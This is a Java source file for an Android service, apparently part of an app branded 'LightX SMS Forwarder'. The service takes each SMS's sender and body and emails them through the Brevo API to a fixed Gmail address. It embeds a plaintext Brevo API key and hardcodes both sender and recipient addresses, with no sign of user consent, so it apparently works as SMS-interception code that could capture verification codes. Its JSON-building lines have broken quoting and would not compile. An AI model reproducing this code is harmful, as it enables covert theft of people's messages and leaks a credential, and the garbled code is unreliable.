package com.lightx.smsforwarder;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Service to forward messages via Brevo (runs briefly to send network request).
 */
public class SmsForwardService extends Service {

    private final OkHttpClient client = new OkHttpClient();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String from = intent.getStringExtra("from");
        String body = intent.getStringExtra("body");

        new Thread(() -> {
            try {
                String json = buildJson(from, body);
                MediaType JSON = MediaType.parse("application/json; charset=utf-8");
                RequestBody rb = RequestBody.create(json, JSON);
                Request req = new Request.Builder()
                        .url("https://api.brevo.com/v3/smtp/email")
                        .addHeader("accept", "application/json")
                        .addHeader("api-key", "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")
                        .addHeader("content-type", "application/json")
                        .post(rb)
                        .build();
                try (Response resp = client.newCall(req).execute()) {
                    Log.d("SmsForwardService", "Sent, code=" + resp.code());
                }
            } catch (Exception e) {
                Log.e("SmsForwardService", "Send failed", e);
            } finally {
                stopSelf(startId);
            }
        }).start();

        return START_NOT_STICKY;
    }

    private String buildJson(String from, String body) {
        String subject = "SMS from " + escapeJson(from);
        String content = "<p><b>From:</b> " + escapeJson(from) + "</p><p>" + escapeJson(body) + "</p>";

        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append(""sender": {"name":"LightX SMS Forwarder","email":"").append(escapeJson("alahlymasr9@gmail.com")).append(""},");
        sb.append(""to": [{"email":"").append(escapeJson("ainsports12@gmail.com")).append(""}],");
        sb.append(""subject":"").append(escapeJson(subject)).append("",");
        sb.append(""htmlContent":"").append(escapeJson(content)).append(""");
        sb.append("}");
        return sb.toString();
    }

    private String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
